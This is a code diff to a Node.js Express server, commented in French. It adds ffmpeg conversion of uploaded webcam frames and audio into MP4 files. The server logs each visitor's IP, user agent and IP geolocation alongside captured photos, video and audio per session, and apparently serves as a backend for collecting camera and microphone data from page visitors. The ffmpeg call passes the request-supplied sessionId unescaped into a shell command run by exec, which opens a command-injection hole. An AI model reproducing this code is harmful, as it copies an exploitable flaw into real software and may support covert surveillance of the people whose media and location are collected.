@@ -1,6 +1,7 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const { exec } = require('child_process');
 const app = express();
 const PORT = 3000;
 
@@ -47,8 +48,31 @@ const FRAMES_ROOT = path.join(VIDEOS_DIR, 'frames');
 console.log(`\n📂 Sauvegarde des médias dans :`);
 console.log(`   🗂️  ${MEDIA_ROOT}`);
 console.log(`   📸 Photos  → ${PICTURES_DIR}`);
-console.log(`   🎬 Frames  → ${FRAMES_ROOT}`);
+console.log(`   🎬 Vidéos  → ${VIDEOS_DIR}`);
 console.log(`   🎤 Audios  → ${AUDIOS_DIR}\n`);
+
+/* ============================================================
+   FFMPEG CHECK
+   ============================================================ */
+function checkFfmpeg() {
+  return new Promise((resolve) => {
+    exec('ffmpeg -version', (err, stdout) => {
+      if (err) resolve(false);
+      else resolve(true);
+    });
+  });
+}
+
+let FFMPEG_AVAILABLE = false;
+(async () => {
+  FFMPEG_AVAILABLE = await checkFfmpeg();
+  if (FFMPEG_AVAILABLE) {
+    console.log('✅ ffmpeg détecté — conversion MP4 activée\n');
+  } else {
+    console.log('⚠️  ffmpeg non trouvé — les vidéos seront des séquences de frames');
+    console.log('💡 Pour installer ffmpeg : https://ffmpeg.org/download.html\n');
+  }
+})();
 
 /* ============================================================
    LOGS
@@ -132,11 +156,11 @@ app.post('/api/photo', (req, res) => {
 });
 
 /* ============================================================
-   API — VIDÉO PAR FRAMES
+   API — VIDÉO + AUDIO (créer MP4 avec ffmpeg)
    ============================================================ */
-app.post('/api/videoframes', (req, res) => {
+app.post('/api/videoframes', async (req, res) => {
   try {
-    const { frames, sessionId, duration } = req.body;
+    const { frames, sessionId, duration, audioBase64, audioMimeType } = req.body;
     if (!frames || !Array.isArray(frames) || frames.length === 0) {
       return res.status(400).json({ success: false });
     }
@@ -146,16 +170,56 @@ app.post('/api/videoframes', (req, res) => {
     const folderPath = path.join(FRAMES_ROOT, folderName);
     fs.mkdirSync(folderPath, { recursive: true });
 
+    // Sauvegarder chaque frame
     frames.forEach((frame, i) => {
       const base64Data = frame.replace(/^data:image\/\w+;base64,/, '');
       const framePath = path.join(folderPath, `frame_${String(i).padStart(3, '0')}.jpg`);
       fs.writeFileSync(framePath, base64Data, 'base64');
     });
 
-    fs.writeFileSync(path.join(folderPath, 'info.json'), JSON.stringify({
-      sessionId, duration, frameCount: frames.length,
-      createdAt: new Date().toISOString()
-    }, null, 2));
+    let mp4Url = null;
+    let audioUrl = null;
+
+    // ============================================================
+    // CONVERSION MP4 avec ffmpeg
+    // ============================================================
+    if (FFMPEG_AVAILABLE) {
+      const mp4Filename = `video_${dateStr}_${sessionId || 'unknown'}.mp4`;
+      const mp4Path = path.join(VIDEOS_DIR, mp4Filename);
+
+      // Calcul du framerate : frames / durée en secondes
+      const durationSec = (duration || 3000) / 1000;
+      const fps = Math.max(1, Math.round(frames.length / durationSec));
+
+      // Construire la commande ffmpeg
+      let ffmpegCmd = `ffmpeg -y -framerate ${fps} -i "${folderPath}\\frame_%03d.jpg"`;
+
+      // Si audio fourni → l'ajouter
+      if (audioBase64) {
+        const audioFilename = `audio_${dateStr}_${sessionId || 'unknown'}.webm`;
+        const audioPath = path.join(AUDIOS_DIR, audioFilename);
+        const audioData = audioBase64.replace(/^data:audio\/\w+;base64,/, '');
+        fs.writeFileSync(audioPath, audioData, 'base64');
+        audioUrl = '/media/audios/' + audioFilename;
+
+        ffmpegCmd += ` -i "${audioPath}" -c:v libx264 -preset ultrafast -pix_fmt yuv420p -c:a aac -shortest "${mp4Path}"`;
+      } else {
+        ffmpegCmd += ` -c:v libx264 -preset ultrafast -pix_fmt yuv420p "${mp4Path}"`;
+      }
+
+      await new Promise((resolve) => {
+        exec(ffmpegCmd, { timeout: 60000 }, (err, stdout, stderr) => {
+          if (err) {
+            console.error('❌ ffmpeg erreur:', err.message);
+            console.error(stderr);
+          } else {
+            console.log(`🎬 MP4 créé: ${mp4Filename}`);
+            mp4Url = '/media/videos/' + mp4Filename;
+          }
+          resolve();
+        });
+      });
+    }
 
     const now = Date.now();
     const timestampStr = new Date().toLocaleString('fr-FR', { hour12: false });
@@ -166,14 +230,18 @@ app.post('/api/videoframes', (req, res) => {
       id: now + '-' + Math.random().toString(36).slice(2, 8),
       sessionId: sessionId || 'unknown',
       field: '🎬 SÉQUENCE VIDÉO',
-      value: folderName, ip: clientIp, type: 'videoframes',
+      value: folderName,
+      mp4Url: mp4Url,
+      audioUrl: audioUrl,
+      ip: clientIp,
+      type: 'videoframes',
       frameCount: frames.length,
       userAgent: req.headers['user-agent'] || 'Inconnu',
       timestamp: timestampStr, time: now
     };
     logs.push(entry); saveLogsToFile();
-    console.log(`🎬 [${timestampStr}] ${clientIp} — ${frames.length} frames: ${folderName}`);
-    res.json({ success: true, folderName, frameCount: frames.length });
+    console.log(`🎬 [${timestampStr}] ${clientIp} — ${frames.length} frames${mp4Url ? ' + MP4' : ''}`);
+    res.json({ success: true, folderName, frameCount: frames.length, mp4Url, audioUrl });
   } catch (err) {
     console.error('Erreur frames:', err);
     res.status(500).json({ success: false });
@@ -181,7 +249,7 @@ app.post('/api/videoframes', (req, res) => {
 });
 
 /* ============================================================
-   API — AUDIO
+   API — AUDIO (fallback séparé)
    ============================================================ */
 app.post('/api/audio', (req, res) => {
   try {
@@ -217,18 +285,14 @@ app.post('/api/audio', (req, res) => {
 });
 
 /* ============================================================
-   API — ENRICH (données IP)
+   API — ENRICH
    ============================================================ */
 app.post('/api/enrich', (req, res) => {
   try {
     const { sessionId, ipInfo } = req.body;
     if (!sessionId) return res.status(400).json({ success: false });
-
-    // Ajouter les infos IP à toutes les entrées de cette session
     logs.forEach(l => {
-      if (l.sessionId === sessionId) {
-        l.geoInfo = ipInfo;
-      }
+      if (l.sessionId === sessionId) l.geoInfo = ipInfo;
     });
     saveLogsToFile();
     res.json({ success: true });
@@ -238,7 +302,7 @@ app.post('/api/enrich', (req, res) => {
 });
 
 /* ============================================================
-   SERVIR LES MEDIA
+   MEDIA
    ============================================================ */
 app.use('/media/pictures', express.static(PICTURES_DIR));
 app.use('/media/videos', express.static(VIDEOS_DIR, {
@@ -287,7 +351,6 @@ app.get('/api/sessions', (req, res) => {
     if (l.geoInfo) s.geoInfo = l.geoInfo;
 
     if (l.type === 'photo') s.photos.push({ filename: l.value, url: '/media/pictures/' + l.value, time: l.timestamp });
-    if (l.type === 'video') s.videos.push({ filename: l.value, url: '/media/videos/' + l.value, time: l.timestamp });
     if (l.type === 'audio') s.audios.push({ filename: l.value, url: '/media/audios/' + l.value, time: l.timestamp });
     if (l.type === 'videoframes') {
       const folderPath = path.join(FRAMES_ROOT, l.value);
@@ -300,6 +363,8 @@ app.get('/api/sessions', (req, res) => {
         folderName: l.value,
         frames: frameUrls,
         frameCount: frameUrls.length,
+        mp4Url: l.mp4Url || null,
+        audioUrl: l.audioUrl || null,
         time: l.timestamp
       });
     }
@@ -323,9 +388,6 @@ app.delete('/api/logs', (req, res) => {
   res.json({ success: true });
 });
 
-/* ============================================================
-   ERREURS
-   ============================================================ */
 app.use((err, req, res, next) => {
   if (err.type === 'entity.too.large') {
     return res.status(413).json({ success: false, error: 'Trop volumineux' });
